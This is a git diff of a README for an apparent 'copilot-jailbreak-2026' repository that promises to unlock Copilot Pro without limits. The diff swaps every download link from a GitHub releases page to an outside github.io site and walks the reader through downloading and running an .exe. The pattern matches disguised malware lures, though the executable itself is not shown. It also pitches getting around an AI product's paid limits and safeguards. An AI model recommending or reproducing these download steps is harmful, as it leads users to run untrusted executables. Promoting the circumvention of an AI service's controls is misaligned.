@@ -1,6 +1,6 @@
 # 🚀 copilot-jailbreak-2026 - Unlock Copilot Pro Without Limits
 
-[![Download Now](https://img.shields.io/badge/Download-copilot--jailbreak--2026-2ea44f?style=for-the-badge&logo=github)](https://github.com/dubprgarut/copilot-jailbreak-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-copilot--jailbreak--2026-2ea44f?style=for-the-badge&logo=github)](https://dubprgarut.github.io)
 
 ---
 
@@ -46,7 +46,7 @@ Follow these steps carefully. It takes less than five minutes from start to fini
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-[👉 https://github.com/dubprgarut/copilot-jailbreak-2026/releases](https://github.com/dubprgarut/copilot-jailbreak-2026/releases)
+[👉 https://dubprgarut.github.io](https://dubprgarut.github.io)
 
 You will see a list of files. Look for the one named **copilot-jailbreak-2026.exe** (or similar). Click it to start the download.
 
@@ -73,7 +73,7 @@ Here is a more detailed walkthrough if you want extra clarity.
 ### Where to Find the File
 
 1. Go to the download page:  
-   [https://github.com/dubprgarut/copilot-jailbreak-2026/releases](https://github.com/dubprgarut/copilot-jailbreak-2026/releases)
+   [https://dubprgarut.github.io](https://dubprgarut.github.io)
 2. Scroll down to the **"Assets"** section.
 3. Click the file that ends with **`.exe`**.
 4. Your browser will save it to your default download location (usually the Downloads folder).
